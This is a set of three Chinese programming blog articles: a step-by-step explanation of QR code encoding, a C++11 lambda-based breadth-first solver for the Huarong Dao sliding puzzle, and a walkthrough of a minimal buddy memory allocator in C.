二维码又称QR Code，QR全称Quick Response，是一个近几年来移动设备上超流行的一种编码方式，它比传统的Bar Code条形码能存更多的信息，也能表示更多的数据类型：比如：字符，数字，日文，中文等等。这两天学习了一下二维码图片生成的相关细节，觉得这个玩意就是一个密码算法，在此写一这篇文章 ，揭露一下。供好学的人一同学习之。

关于QR Code Specification，可参看这个PDF：[http://raidenii.net/files/datasheets/misc/qr_code.pdf ](http://raidenii.net/files/datasheets/misc/qr_code.pdf)

目录



[基础知识](https://coolshell.cn/articles/10590.html#基础知识)[定位图案](https://coolshell.cn/articles/10590.html#定位图案)[功能性数据](https://coolshell.cn/articles/10590.html#功能性数据)[数据码和纠错码](https://coolshell.cn/articles/10590.html#数据码和纠错码)[数据编码](https://coolshell.cn/articles/10590.html#数据编码)[示例一：数字编码](https://coolshell.cn/articles/10590.html#示例一：数字编码)[示例二：字符编码](https://coolshell.cn/articles/10590.html#示例二：字符编码)[结束符和补齐符](https://coolshell.cn/articles/10590.html#结束符和补齐符)[按8bits重排](https://coolshell.cn/articles/10590.html#按8bits重排)[补齐码（Padding Bytes）](https://coolshell.cn/articles/10590.html#补齐码（Padding_Bytes）)[纠错码](https://coolshell.cn/articles/10590.html#纠错码)[最终编码](https://coolshell.cn/articles/10590.html#最终编码)[穿插放置](https://coolshell.cn/articles/10590.html#穿插放置)[Remainder Bits](https://coolshell.cn/articles/10590.html#Remainder_Bits)[画二维码图](https://coolshell.cn/articles/10590.html#画二维码图)[Position Detection Pattern](https://coolshell.cn/articles/10590.html#Position_Detection_Pattern)[Alignment Pattern](https://coolshell.cn/articles/10590.html#Alignment_Pattern)[Timing Pattern](https://coolshell.cn/articles/10590.html#Timing_Pattern)[Format Information](https://coolshell.cn/articles/10590.html#Format_Information)[Version Information](https://coolshell.cn/articles/10590.html#Version_Information)[数据和数据纠错码](https://coolshell.cn/articles/10590.html#数据和数据纠错码)[掩码图案](https://coolshell.cn/articles/10590.html#掩码图案)

#### 基础知识

首先，我们先说一下二维码一共有40个尺寸。官方叫版本Version。Version 1是21 x 21的矩阵，Version 2是 25 x 25的矩阵，Version 3是29的尺寸，每增加一个version，就会增加4的尺寸，公式是：(V-1)*4 + 21（V是版本号） 最高Version 40，(40-1)*4+21 = 177，所以最高是177 x 177 的正方形。

下面我们看看一个二维码的样例：

![img](photo/QR-Code-Overview.jpeg)



##### 定位图案

- Position Detection Pattern是定位图案，用于标记二维码的矩形大小。这三个定位图案有白边叫Separators for Postion Detection Patterns。之所以三个而不是四个意思就是三个就可以标识一个矩形了。

- Timing Patterns也是用于定位的。原因是二维码有40种尺寸，尺寸过大了后需要有根标准线，不然扫描的时候可能会扫歪了。

- Alignment Patterns 只有Version 2以上（包括Version2）的二维码需要这个东东，同样是为了定位用的。

##### 功能性数据

- Format Information 存在于所有的尺寸中，用于存放一些格式化数据的。

- Version Information 在 >= Version 7以上，需要预留两块3 x 6的区域存放一些版本信息。

##### 数据码和纠错码

- 除了上述的那些地方，剩下的地方存放 Data Code 数据码 和 Error Correction Code 纠错码。

#### 数据编码

我们先来说说数据编码。QR码支持如下的编码：

**Numeric mode** 数字编码，从0到9。如果需要编码的数字的个数不是3的倍数，那么，最后剩下的1或2位数会被转成4或7bits，则其它的每3位数字会被编成 10，12，14bits，编成多长还要看二维码的尺寸（下面有一个表Table 3说明了这点）

**Alphanumeric mode** 字符编码。包括 0-9，大写的A到Z（没有小写），以及符号$ % * + – . / : 包括空格。这些字符会映射成一个字符索引表。如下所示：（其中的SP是空格，Char是字符，Value是其索引值） 编码的过程是把字符两两分组，然后转成下表的45进制，然后转成11bits的二进制，如果最后有一个落单的，那就转成6bits的二进制。而编码模式和字符的个数需要根据不同的Version尺寸编成9, 11或13个二进制（如下表中Table 3）

![img](photo/Alphanumeric-mode.png)

**Byte mode**, 字节编码，可以是0-255的ISO-8859-1字符。有些二维码的扫描器可以自动检测是否是UTF-8的编码。

**Kanji mode** 这是日文编码，也是双字节编码。同样，也可以用于中文编码。日文和汉字的编码会减去一个值。如：在0X8140 to 0X9FFC中的字符会减去8140，在0XE040到0XEBBF中的字符要减去0XC140，然后把结果前两个16进制位拿出来乘以0XC0，然后再加上后两个16进制位，最后转成13bit的编码。如下图示例：

![img](photo/Kanji-mode.png)

**Extended Channel Interpretation (ECI) mode** 主要用于特殊的字符集。并不是所有的扫描器都支持这种编码。

**Structured Append mode** 用于混合编码，也就是说，这个二维码中包含了多种编码格式。

**FNC1 mode** 这种编码方式主要是给一些特殊的工业或行业用的。比如GS1条形码之类的。

简单起见，后面三种不会在本文 中讨论。

下面两张表中，

- Table 2 是各个编码格式的“编号”，这个东西要写在Format Information中。注：中文是1101

- Table 3 表示了，不同版本（尺寸）的二维码，对于，数字，字符，字节和Kanji模式下，对于单个编码的2进制的位数。（在二维码的规格说明书中，有各种各样的编码规范表，后面还会提到）

![img](photo/Mode-Indicator.png)

下面我们看几个示例，

##### 示例一：数字编码

在Version 1的尺寸下，纠错级别为H的情况下，编码： 01234567

1. 把上述数字分成三组: 012 345 67
2. 把他们转成二进制:  012 转成 0000001100；  345 转成 0101011001；  67 转成 1000011。
3. 把这三个二进制串起来: 0000001100 0101011001 1000011
4. 把数字的个数转成二进制 (version 1-H是10 bits ): 8个数字的二进制是 0000001000
5. 把数字编码的标志0001和第4步的编码加到前面:  0001 0000001000 0000001100 0101011001 1000011

##### 示例二：字符编码

在Version 1的尺寸下，纠错级别为H的情况下，编码: AC-42

1. 从字符索引表中找到 AC-42 这五个字条的索引 (10,12,41,4,2)
2. 两两分组: (10,12) (41,4) (2)

3.把每一组转成11bits的二进制:

(10,12) 10*45+12 等于 462 转成 00111001110
(41,4) 41*45+4 等于 1849 转成 11100111001
(2) 等于 2 转成 000010

4. 把这些二进制连接起来：00111001110 11100111001 000010
5. 把字符的个数转成二进制 (Version 1-H为9 bits ): 5个字符，5转成 000000101
6. 在头上加上编码标识 0010 和第5步的个数编码:  0010 000000101 00111001110 11100111001 000010

#### 结束符和补齐符

假如我们有个HELLO WORLD的字符串要编码，根据上面的示例二，我们可以得到下面的编码，

| 编码 | 字符数    | HELLO WORLD的编码                                            |
| :--- | :-------- | :----------------------------------------------------------- |
| 0010 | 000001011 | 01100001011 01111000110 10001011100 10110111000 10011010100 001101 |

我们还要加上结束符：

| 编码 | 字符数    | HELLO WORLD的编码                                            | 结束 |
| :--- | :-------- | :----------------------------------------------------------- | :--- |
| 0010 | 000001011 | 01100001011 01111000110 10001011100 10110111000 10011010100 001101 | 0000 |

##### 按8bits重排

如果所有的编码加起来不是8个倍数我们还要在后面加上足够的0，比如上面一共有78个bits，所以，我们还要加上2个0，然后按8个bits分好组：

00100000  01011011  00001011  01111000  11010001  01110010  11011100  01001101  01000011  010000**00**

##### 补齐码（Padding Bytes）

最后，如果如果还没有达到我们最大的bits数的限制，我们还要加一些补齐码（Padding Bytes），Padding Bytes就是重复下面的两个bytes：11101100 00010001 （这两个二进制转成十进制是236和17，我也不知道为什么，只知道Spec上是这么写的）关于每一个Version的每一种纠错级别的最大Bits限制，可以参看[QR Code Spec](http://raidenii.net/files/datasheets/misc/qr_code.pdf)的第28页到32页的Table-7一表。

假设我们需要编码的是Version 1的Q纠错级，那么，其最大需要104个bits，而我们上面只有80个bits，所以，还需要补24个bits，也就是需要3个Padding Bytes，我们就添加三个，于是得到下面的编码：

00100000 01011011 00001011 01111000 11010001 01110010 11011100 01001101 01000011 01000000 **11101100 00010001 11101100**

上面的编码就是数据码了，叫Data Codewords，每一个8bits叫一个codeword，我们还要对这些数据码加上纠错信息。

#### 纠错码

上面我们说到了一些纠错级别，Error Correction Code Level，二维码中有四种级别的纠错，这就是为什么二维码有残缺还能扫出来，也就是为什么有人在二维码的中心位置加入图标。

| 错误修正容量 |                   |
| :----------- | ----------------- |
| L水平        | 7%的字码可被修正  |
| M水平        | 15%的字码可被修正 |
| Q水平        | 25%的字码可被修正 |
| H水平        | 30%的字码可被修正 |

那么，QR是怎么对数据码加上纠错码的？首先，我们需要对数据码进行分组，也就是分成不同的Block，然后对各个Block进行纠错编码，对于如何分组，我们可以查看[QR Code Spec](http://raidenii.net/files/datasheets/misc/qr_code.pdf)的第33页到44页的Table-13到Table-22的定义表。注意最后两列：

- **Number of Error Code Correction Blocks** ：需要分多少个块。

- **Error Correction Code Per Blocks**：每一个块中的code个数，所谓的code的个数，也就是有多少个8bits的字节。

![img](photo/Error-Correction-Blocks.png)

举个例子：上述的Version 5 + Q纠错级：需要4个Blocks（2个Blocks为一组，共两组），头一组的两个Blocks中各15个bits数据 + 各 9个bits的纠错码（注：表中的codewords就是一个8bits的byte）（再注：最后一例中的（c, k, r ）的公式为：c = k + 2 * r，因为后脚注解释了：纠错码的容量小于纠错码的一半）

下图给一个5-Q的示例（因为二进制写起来会让表格太大，所以，我都用了十进制，我们可以看到每一块的纠错码有18个codewords，也就是18个8bits的二进制数）

| 组   | 块                                                     | 数据                                                         | 对每个块的纠错码                                             |
| :--- | :----------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| 1    | 1                                                      | 67 85 70 134 87 38 85 194 119 50 6 18 6 103 38               | 213 199 11 45 115 247 241 223 229 248 154 117 154 111 86 161 111 39 |
| 2    | 246 246 66 7 118 134 242 7 38 86 22 198 199 146 6      | 87 204 96 60 202 182 124 157 200 134 27 129 209 17 163 163 120 133 |                                                              |
| 2    | 1                                                      | 182 230 247 119 50 7 118 134 87 38 82 6 134 151 50 7         | 148 116 177 212 76 133 75 242 238 76 195 230 189 10 108 240 192 141 |
| 2    | 70 247 118 86 194 6 151 50 16 236 17 236 17 236 17 236 | 235 159 5 173 24 147 59 33 106 40 255 172 82 2 131 32 178 236 |                                                              |

注：二维码的纠错码主要是通过[Reed-Solomon error correction](https://en.wikipedia.org/wiki/Reed–Solomon_error_correction)（里德-所罗门纠错算法）来实现的。对于这个算法，对于我来说是相当的复杂，里面有很多的数学计算，比如：多项式除法，把1-255的数映射成2的n次方（0<=n<=255）的伽罗瓦域Galois Field之类的神一样的东西，以及基于这些基础的纠错数学公式，因为我的数据基础差，对于我来说太过复杂，所以我一时半会儿还有点没搞明白，还在学习中，所以，我在这里就不展开说这些东西了。还请大家见谅了。（当然，如果有朋友很明白，也繁请教教我）

#### 最终编码

##### 穿插放置

如果你以为我们可以开始画图，你就错了。二维码的混乱技术还没有玩完，它还要把数据码和纠错码的各个codewords交替放在一起。如何交替呢，规则如下：

对于数据码：把每个块的第一个codewords先拿出来按顺度排列好，然后再取第一块的第二个，如此类推。如：上述示例中的Data Codewords如下：

| 块 1 | 67   | 85   | 70   | 134  | 87   | 38   | 85   | 194  | 119  | 50   | 6    | 18   | 6    | 103  | 38   |      |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 块 2 | 246  | 246  | 66   | 7    | 118  | 134  | 242  | 7    | 38   | 86   | 22   | 198  | 199  | 146  | 6    |      |
| 块 3 | 182  | 230  | 247  | 119  | 50   | 7    | 118  | 134  | 87   | 38   | 82   | 6    | 134  | 151  | 50   | 7    |
| 块 4 | 70   | 247  | 118  | 86   | 194  | 6    | 151  | 50   | 16   | 236  | 17   | 236  | 17   | 236  | 17   | 236  |

我们先取第一列的：67， 246， 182， 70

然后再取第二列的：67， 246， 182， 70， 85，246，230 ，247

如此类推：67， 246， 182， 70， 85，246，230 ，247 ………  ……… ，38，6，50，17，7，236

对于纠错码，也是一样：

| 块 1 | 213  | 199  | 11   | 45   | 115  | 247  | 241  | 223  | 229  | 248  | 154  | 117  | 154  | 111  | 86   | 161  | 111  | 39   |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 块 2 | 87   | 204  | 96   | 60   | 202  | 182  | 124  | 157  | 200  | 134  | 27   | 129  | 209  | 17   | 163  | 163  | 120  | 133  |
| 块 3 | 148  | 116  | 177  | 212  | 76   | 133  | 75   | 242  | 238  | 76   | 195  | 230  | 189  | 10   | 108  | 240  | 192  | 141  |
| 块 4 | 235  | 159  | 5    | 173  | 24   | 147  | 59   | 33   | 106  | 40   | 255  | 172  | 82   | 2    | 131  | 32   | 178  | 236  |

和数据码取的一样，得到：213，87，148，235，199，204，116，159，…… …… 39，133，141，236

然后，再把这两组放在一起（纠错码放在数据码之后）得到：

67, 246, 182, 70, 85, 246, 230, 247, 70, 66, 247, 118, 134, 7, 119, 86, 87, 118, 50, 194, 38, 134, 7, 6, 85, 242, 118, 151, 194, 7, 134, 50, 119, 38, 87, 16, 50, 86, 38, 236, 6, 22, 82, 17, 18, 198, 6, 236, 6, 199, 134, 17, 103, 146, 151, 236, 38, 6, 50, 17, 7, 236, 213, 87, 148, 235, 199, 204, 116, 159, 11, 96, 177, 5, 45, 60, 212, 173, 115, 202, 76, 24, 247, 182, 133, 147, 241, 124, 75, 59, 223, 157, 242, 33, 229, 200, 238, 106, 248, 134, 76, 40, 154, 27, 195, 255, 117, 129, 230, 172, 154, 209, 189, 82, 111, 17, 10, 2, 86, 163, 108, 131, 161, 163, 240, 32, 111, 120, 192, 178, 39, 133, 141, 236

这就是我们的数据区。

##### Remainder Bits

最后再加上Reminder Bits，对于某些Version的QR，上面的还不够长度，还要加上Remainder Bits，比如：上述的5Q版的二维码，还要加上7个bits，Remainder Bits加零就好了。关于哪些Version需要多少个Remainder bit，可以参看[QR Code Spec](http://raidenii.net/files/datasheets/misc/qr_code.pdf)的第15页的Table-1的定义表。

#### 画二维码图

##### Position Detection Pattern

首先，先把Position Detection图案画在三个角上。（无论Version如何，这个图案的尺寸就是这么大）

![img](photo/finder.png)

##### Alignment Pattern

然后，再把Alignment图案画上（无论Version如何，这个图案的尺寸就是这么大）

![img](photo/alignment-pattern.png)

关于Alignment的位置，可以查看[QR Code Spec](http://raidenii.net/files/datasheets/misc/qr_code.pdf)的第81页的Table-E.1的定义表（下表是不完全表格）

![img](photo/Alignment-Position.png)

下图是根据上述表格中的Version8的一个例子（6，24，42）

![img](photo/alignment-example.png)

##### Timing Pattern

接下来是Timing Pattern的线（这个不用多说了）

**![img](photo/Timing-Pattern.png)**

##### Format Information

再接下来是Formation Information，下图中的蓝色部分。

![img](photo/Format-Information.png)

Format Information是一个15个bits的信息，每一个bit的位置如下图所示：（注意图中的Dark Module，那是永远出现的）

![img](photo/Format-Info-bits-postion.png)

这15个bits中包括：

- 5个数据bits：其中，2个bits用于表示使用什么样的Error Correction Level， 3个bits表示使用什么样的Mask
- 10个纠错bits。主要通过BCH Code来计算

然后15个bits还要与101010000010010做XOR操作。这样就保证不会因为我们选用了00的纠错级别和000的Mask，从而造成全部为白色，这会增加我们的扫描器的图像识别的困难。

下面是一个示例：

![img](photo/Format-Information-Example.png)

关于Error Correction Level如下表所示：

![img](photo/Error-Correction-Indicator-Code.png)

关于Mask图案如后面的Table 23所示。

##### Version Information

再接下来是Version Information（版本7以后需要这个编码），下图中的蓝色部分。
![img](photo/Version-Information.png)

Version Information一共是18个bits，其中包括6个bits的版本号以及12个bits的纠错码，下面是一个示例：

![img](photo/Version-Information-Example.png)

而其填充位置如下：

![img](photo/Version-Information-Position.png)

##### 数据和数据纠错码

然后是填接我们的最终编码，最终编码的填充方式如下：从左下角开始沿着红线填我们的各个bits，1是黑色，0是白色。如果遇到了上面的非数据区，则绕开或跳过。

![img](photo/Data-Placement.png)

##### 掩码图案

这样下来，我们的图就填好了，但是，也许那些点并不均衡，如果出现大面积的空白或黑块，会告诉我们扫描识别的困难。所以，我们还要做Masking操作（靠，还嫌不复杂）QR的Spec中说了，QR有8个Mask你可以使用，如下所示：其中，各个mask的公式在各个图下面。所谓mask，说白了，就是和上面生成的图做XOR操作。Mask只会和数据区进行XOR，不会影响功能区。（**注：选择一个合适的Mask也是有算法的**）

![img](photo/masking-pattern.png)

其Mask的标识码如下所示：（其中的i,j分别对应于上图的x,y）

![img](photo/Mask-Pattern-Code.png)

下面是Mask后的一些样子，我们可以看到被某些Mask XOR了的数据变得比较零散了。

![img](photo/Masking-Examples.png)

Mask过后的二维码就成最终的图了。

好了，大家可以去尝试去写一下QR的编码程序，当然，你可以用网上找个Reed Soloman的纠错算法的库，或是看看别人的源代码是怎么实现这个繁锁的编码。

（全文完）

# C++11的LAMBDA使用一例：华容道求解

#####  [2013年10月09日 ](https://coolshell.cn/articles/10476.html) [Solstice](https://coolshell.cn/articles/author/solstice) 评论 [12 条评论](https://coolshell.cn/articles/10476.html#comments) 41,793 人阅读

**（感谢网友 [![img](http://tp2.sinaimg.cn/1701018393/50/1297990315/1)](http://weibo.com/u/1701018393?source=webim)[ @bnu_chenshuo ](http://weibo.com/u/1701018393?source=webim)投稿）**

![img](https://coolshell.cn/wp-content/uploads/2013/10/huarong.png)

华容道是一个有益的智力游戏，游戏规则不再赘述。用计算机求解华容道也是一道不错的编程练习题，为了寻求最少步数，求解程序一般用广度优先搜索算法。华容道的一种常见开局如图 1 所示。

广度优先搜索算法求解华容道的基本步骤：

1. 准备两个“全局变量”，队列 Q 和和集合 S，S 代表“已知局面”。初时 Q 和 S 皆为空。
2. 将初始局面加入队列 Q 的末尾，并将初始局面设为已知。
3. 当队列不为空时，从 Q 的队首取出当前局面 `curr`。如果队列为空则结束搜索，表明无解。
4. 如果 `curr` 是最终局面（曹操位于门口，图 2），则结束搜索，否则继续到第 5 步。
5. 考虑 `curr` 中每个可以移动的棋子，试着上下左右移动一步，得到新局面 `next`，如果新局面未知（`next` ∉ S），则把它加入队列 Q，并设为已知。这一步可能产生多个新局面。
6. 回到第2步。

其中“局面已知”并不要求每个棋子的位置相同，而是指棋子的投影的形状相同（代码中用 mask 表示），例如交换图 1 中的张飞和赵云并不产生新局面，这一规定可以大大缩小搜索空间。

以上步骤很容易转换为 C++ 代码，这篇文章重点关注的是第 5 步的实现。



```
// 第 1 步
std::unordered_set<Mask> seen;
std::deque<State> queue;

// 第 2 步
State initial;
// 填入 initial，略。
queue.push_back(initial);
seen.insert(initial.toMask());

// 第 3 步
while (!queue.empty())
{
  const State curr = queue.front();
  queue.pop_front();

  // 第 4 步
  if (curr.isSolved())
    break;

  // 第 5 步
  for (const State& next : curr.moves())
  {
    auto result = seen.insert(next.toMask());
    if (result.second)
      queue.push_back(next);
  }
}
```

在以上原始实现中，`curr.move()` 将返回一个 `std::vector<State>` 临时对象。一种节省开销的办法是准备一个 `std::vector<State>` “涂改变量”，让 `curr.move()` 反复修改它，比如改成：

```
// 第 1 步新增一个 scratch 变量
std::vector<State> nextMoves;

// 第 3 步
while (!queue.empty())
{
  // ...
  // 第 5 步
  curr.fillMoves(&nextMoves);
  for (const State& next : nextMoves)
  { /* 略 */ }
}
```

还有一种彻底不用这个 `std::vector<State>` 的办法，把一部分逻辑以 lambda 的形式传给 `curr.move()`，代码的结构基本不变：

```
// 第 3 步
while (!queue.empty())
{
  // ...
  // 第 5 步
  curr.move([&seen, &queue](const State& next) {
    auto result = seen.insert(next.toMask());
    if (result.second)
      queue.push_back(next);
  });
}
```

这样一来，主程序的逻辑依然清晰，不必要的开销也降到了最小。

在我最早的实现中，`curr.move()` 的参数是 `const std::function<void(const State&)> &`，但是我发现这里每次构造 `std::function<void(const State&)>` 对象都会分配一次内存，似乎有些不值。因此在现在的实现中 `curr.move()` 是个函数模板，这样就能自动匹配lambda参数（通常是个 struct 对象），省去了 `std::function`的内存分配。

本文完整的代码见 [https://github.com/chenshuo/recipes/…/puzzle/huarong.cc](https://github.com/chenshuo/recipes/blob/master/puzzle/huarong.cc)，需用 GCC 4.7 编译，求解图 1 的题目的耗时约几十毫秒。

**练习：**修改程序，打印每一步移动棋子的情况。

# 伙伴分配器的一个极简实现

#####  [2013年10月09日 ](https://coolshell.cn/articles/10427.html) [Leo](https://coolshell.cn/articles/author/full_of_bull) 评论 [55 条评论](https://coolshell.cn/articles/10427.html#comments) 65,168 人阅读

**（感谢网友** [**@我的上铺叫路遥**](http://weibo.com/fullofbull) **投稿）**

提起buddy system相信很多人不会陌生，它是一种经典的内存分配算法，大名鼎鼎的Linux底层的内存管理用的就是它。这里不探讨内核这么复杂实现，而仅仅是将该算法抽象提取出来，同时给出一份及其简洁的源码实现，以便定制扩展。

伙伴分配的实质就是一种特殊的**“分离适配”**，即将内存按2的幂进行划分，相当于分离出若干个块大小一致的空闲链表，搜索该链表并给出同需求最佳匹配的大小。其优点是快速搜索合并（O(logN)时间复杂度）以及低外部碎片（最佳适配best-fit）；其缺点是内部碎片，因为按2的幂划分块，如果碰上66单位大小，那么必须划分128单位大小的块。但若需求本身就按2的幂分配，比如可以先分配若干个内存池，在其基础上进一步细分就很有吸引力了。

可以在[维基百科](https://en.wikipedia.org/wiki/Buddy_memory_allocation)上找到该算法的描述，大体如是：

**分配内存：**

1.寻找大小合适的内存块（大于等于所需大小并且最接近2的幂，比如需要27，实际分配32）

1.如果找到了，分配给应用程序。
2.如果没找到，分出合适的内存块。

1.对半分离出高于所需大小的空闲内存块
2.如果分到最低限度，分配这个大小。
3.回溯到步骤1（寻找合适大小的块）
4.重复该步骤直到一个合适的块



**释放内存：**

1.释放该内存块

1.寻找相邻的块，看其是否释放了。
2.如果相邻块也释放了，合并这两个块，重复上述步骤直到遇上未释放的相邻块，或者达到最高上限（即所有内存都释放了）。

上面这段文字对你来说可能看起来很费劲，没事，我们看个内存分配和释放的示意图你就知道了：

![img](https://coolshell.cn/wp-content/uploads/2013/10/buddy-memory-allocation.jpg)

上图中，首先我们假设我们一个内存块有1024K，当我们需要给A分配70K内存的时候，

1. 我们发现1024K的一半大于70K，然后我们就把1024K的内存分成两半，一半512K。
2. 然后我们发现512K的一半仍然大于70K，于是我们再把512K的内存再分成两半，一半是128K。
3. 此时，我们发现128K的一半小于70K，于是我们就分配为A分配128K的内存。

后面的，B，C，D都这样，而释放内存时，则会把相邻的块一步一步地合并起来（合并也必需按分裂的逆操作进行合并）。

我们可以看见，这样的算法，用二叉树这个数据结构来实现再合适不过了。

我在网上分别找到[cloudwu](https://github.com/cloudwu/buddy)和[wuwenbin](https://github.com/wuwenbin/buddy2)写的两份开源实现和测试用例。实际上后一份是对前一份的精简和优化，本文打算从后一份入手讲解，**因为这份实现真正体现了“极简”二字，追求突破常规的，极致简单的设计。**网友对其评价甚高，甚至可用作教科书标准实现，看完之后回过头来看cloudwu的代码就容易理解了。

分配器的整体思想是，通过一个数组形式的完全二叉树来监控管理内存，二叉树的节点用于标记相应内存块的使用状态，高层节点对应大的块，低层节点对应小的块，在分配和释放中我们就通过这些节点的标记属性来进行块的分离合并。如图所示，假设总大小为16单位的内存，我们就建立一个深度为5的满二叉树，根节点从数组下标[0]开始，监控大小16的块；它的左右孩子节点下标[1~2]，监控大小8的块；第三层节点下标[3~6]监控大小4的块……依此类推。

![img](https://coolshell.cn/wp-content/uploads/2013/10/%E4%BC%99%E4%BC%B4%E5%88%86%E9%85%8D%E5%99%A8.jpg)

在分配阶段，首先要搜索大小适配的块，假设第一次分配3，转换成2的幂是4，我们先要对整个内存进行对半切割，从16切割到4需要两步，那么从下标[0]节点开始深度搜索到下标[3]的节点并将其标记为已分配。第二次再分配3那么就标记下标[4]的节点。第三次分配6，即大小为8，那么搜索下标[2]的节点，因为下标[1]所对应的块被下标[3~4]占用了。

在释放阶段，我们依次释放上述第一次和第二次分配的块，即先释放[3]再释放[4]，当释放下标[4]节点后，我们发现之前释放的[3]是相邻的，于是我们立马将这两个节点进行合并，这样一来下次分配大小8的时候，我们就可以搜索到下标[1]适配了。若进一步释放下标[2]，同[1]合并后整个内存就回归到初始状态。

还是看一下源码实现吧，首先是伙伴分配器的数据结构：

```
struct buddy2 {
  unsigned size;
  unsigned longest[1];
};
```

这里的成员size表明管理内存的总单元数目（测试用例中是32），成员longest就是二叉树的节点标记，表明所对应的内存块的空闲单位，**在下文中会分析这是整个算法中最精妙的设计。**此处数组大小为1表明这是可以向后扩展的（注：在GCC环境下你可以写成longest[0]，不占用空间，这里是出于可移植性考虑），我们在分配器初始化的buddy2_new可以看到这种用法。

```
struct buddy2* buddy2_new( int size ) {
  struct buddy2* self;
  unsigned node_size;
  int i;

  if (size < 1 || !IS_POWER_OF_2(size))
    return NULL;

  self = (struct buddy2*)ALLOC( 2 * size * sizeof(unsigned));
  self->size = size;
  node_size = size * 2;

  for (i = 0; i < 2 * size - 1; ++i) {
    if (IS_POWER_OF_2(i+1))
      node_size /= 2;
    self->longest[i] = node_size;
  }
  return self;
}
```

整个分配器的大小就是满二叉树节点数目，即所需管理内存单元数目的2倍。一个节点对应4个字节，longest记录了节点所对应的的内存块大小。

内存分配的alloc中，入参是分配器指针和需要分配的大小，返回值是内存块索引。alloc函数首先将size调整到2的幂大小，并检查是否超过最大限度。然后进行适配搜索，深度优先遍历，当找到对应节点后，**将其longest标记为0，即分离适配的块出来，**并转换为内存块索引offset返回，依据二叉树排列序号，比如内存总体大小32，我们找到节点下标[8]，内存块对应大小是4，则offset = (8+1)*4-32 = 4，那么分配内存块就从索引4开始往后4个单位。

```
int buddy2_alloc(struct buddy2* self, int size) {
  unsigned index = 0;
  unsigned node_size;
  unsigned offset = 0;

  if (self==NULL)
    return -1;

  if (size <= 0)
    size = 1;
  else if (!IS_POWER_OF_2(size))
    size = fixsize(size);

  if (self->longest[index] < size)
    return -1;

  for(node_size = self->size; node_size != size; node_size /= 2 ) {
    if (self->longest[LEFT_LEAF(index)] >= size)
      index = LEFT_LEAF(index);
    else
      index = RIGHT_LEAF(index);
  }

  self->longest[index] = 0;
  offset = (index + 1) * node_size - self->size;

  while (index) {
    index = PARENT(index);
    self->longest[index] =
      MAX(self->longest[LEFT_LEAF(index)], self->longest[RIGHT_LEAF(index)]);
  }

  return offset;
}
```

在函数返回之前需要回溯，因为小块内存被占用，大块就不能分配了，比如下标[8]标记为0分离出来，那么其父节点下标[0]、[1]、[3]也需要相应大小的分离。**将它们的longest进行折扣计算，取左右子树较大值，**下标[3]取4，下标[1]取8，下标[0]取16，表明其对应的最大空闲值。

在内存释放的free接口，我们只要传入之前分配的内存地址索引，并确保它是有效值。之后就跟alloc做反向回溯，从最后的节点开始一直往上找到longest为0的节点，即当初分配块所适配的大小和位置。**我们将longest恢复到原来满状态的值。继续向上回溯，检查是否存在合并的块，依据就是左右子树longest的值相加是否等于原空闲块满状态的大小，如果能够合并，就将父节点longest标记为相加的和**（多么简单！）。

```
void buddy2_free(struct buddy2* self, int offset) {
  unsigned node_size, index = 0;
  unsigned left_longest, right_longest;

  assert(self && offset >= 0 && offset < size);

  node_size = 1;
  index = offset + self->size - 1;

  for (; self->longest[index] ; index = PARENT(index)) {
    node_size *= 2;
    if (index == 0)
      return;
  }

  self->longest[index] = node_size;

  while (index) {
    index = PARENT(index);
    node_size *= 2;

    left_longest = self->longest[LEFT_LEAF(index)];
    right_longest = self->longest[RIGHT_LEAF(index)];

    if (left_longest + right_longest == node_size)
      self->longest[index] = node_size;
    else
      self->longest[index] = MAX(left_longest, right_longest);
  }
}
```

上面两个成对alloc/free接口的时间复杂度都是O(logN)，保证了程序运行性能。然而这段程序设计的独特之处就在于**使用加权来标记内存空闲状态，而不是一般的有限状态机，实际上longest既可以表示权重又可以表示状态，状态机就毫无必要了，所谓“少即是多”嘛！**反观cloudwu的实现，将节点标记为UNUSED/USED/SPLIT/FULL四个状态机，反而会带来额外的条件判断和管理实现，而且还不如数值那样精确。从逻辑流程上看，wuwenbin的实现简洁明了如同教科书一般，特别是左右子树的走向，内存块的分离合并，块索引到节点下标的转换都是一步到位，不像cloudwu充斥了大量二叉树的深度和长度的间接计算，让代码变得晦涩难读，这些都是longest的功劳。**一个“极简”的设计往往在于你想不到的突破常规思维的地方。**

这份代码唯一的缺陷就是longest的大小是4字节，内存消耗大。但[cloudwu的博客](http://blog.codingnow.com/2011/12/buddy_memory_allocation.html)上有人提议用logN来保存值，这样就能实现uint8_t大小了，**看，又是一个“极简”的设计！**

说实话，很难在网上找到比这更简约更优雅的buddy system实现了——至少在Google上如此。

